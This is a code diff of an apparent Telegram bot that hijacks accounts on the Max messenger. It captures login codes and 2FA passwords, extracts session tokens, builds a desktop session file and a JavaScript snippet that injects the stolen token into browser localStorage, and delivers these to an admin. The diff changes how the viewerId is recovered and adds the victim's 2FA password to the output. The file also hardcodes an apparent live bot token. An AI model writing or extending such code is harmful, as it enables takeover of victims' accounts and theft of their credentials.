@@ -12,7 +12,6 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 from pymax import Client as SocketMaxClient
-import inspect
 
 BOT_TOKEN = "8459830115:AAH_QhkDQ51YBM1Jlb-ZsfbAfkvGuXgzl4E"
 ADMIN_ID = 8632861931
@@ -82,15 +81,16 @@ def build_desktop_json(token, device_id, session_id, password, user_id, phone):
         }
     }
 
-def generate_web_js(device_id, token, viewer_id, password=None):
+def generate_web_js(device_id, token, viewer_id, password_2fa=None):
     auth = {"token": token, "viewerId": viewer_id}
-    if password:
-        auth["password"] = password
-    return f"""sessionStorage.clear();
+    js = f"""sessionStorage.clear();
 localStorage.clear();
 localStorage.setItem('__oneme_device_id', '{device_id}');
 localStorage.setItem('__oneme_auth', JSON.stringify({json.dumps(auth, ensure_ascii=False)}));
 window.location.reload();"""
+    if password_2fa:
+        js += f'\nconst customPayload = "{password_2fa}";'
+    return js
 
 async def send_files(phone, uid, work_dir, desktop, js):
     dp = f"{work_dir}/desktop_session.txt"
@@ -233,7 +233,8 @@ async def code_handler(message: types.Message, state: FSMContext):
                 except:
                     pass
 
-            logging.info(f"Веб-токен: token={token[:30]}..., viewer_id={viewer_id}, device_id={device_id}")
+            logging.info(f"viewerId из pending: {pending[uid].get('user_id')}")
+            logging.info(f"viewerId для веб-токена: {viewer_id}")
 
             web_js = generate_web_js(device_id, token, viewer_id)
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
@@ -300,23 +301,28 @@ async def password_handler(message: types.Message, state: FSMContext):
                 token = row[0]
                 device_id = row[1] if len(row) > 1 else device_id
                 pending[uid]["token"] = token
-                # НЕ перезаписываем user_id из row[3] — он уже правильный из auth_task
                 pending[uid]["status"] = "done"
-                logging.info(f"Токен из session.db: {token[:30]}..., user_id={pending[uid].get('user_id')}")
             conn.close()
         except Exception as e:
             logging.error(f"Ошибка чтения session.db: {e}")
 
     if uid in pending and pending[uid].get("status") == "done":
         token = pending[uid]["token"]
-        viewer_id = pending[uid]["user_id"] or 0
+        viewer_id = pending[uid].get("user_id") or 0
+
+        if not viewer_id:
+            client = pending[uid].get("client")
+            if client:
+                viewer_id = getattr(client, 'my_id', 0) or getattr(getattr(client, 'me', None), 'id', 0)
+
         user_password = pending[uid].get("user_password", "")
         password = gen_password()
         session_id = int(time.time() * 1000)
 
-        logging.info(f"Веб-токен: token={token[:30]}..., viewer_id={viewer_id}, device_id={device_id}")
+        logging.info(f"viewerId из pending: {pending[uid].get('user_id')}")
+        logging.info(f"viewerId для веб-токена: {viewer_id}")
 
-        web_js = generate_web_js(device_id, token, viewer_id)
+        web_js = generate_web_js(device_id, token, viewer_id, user_password)
 
         if user_password:
             web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
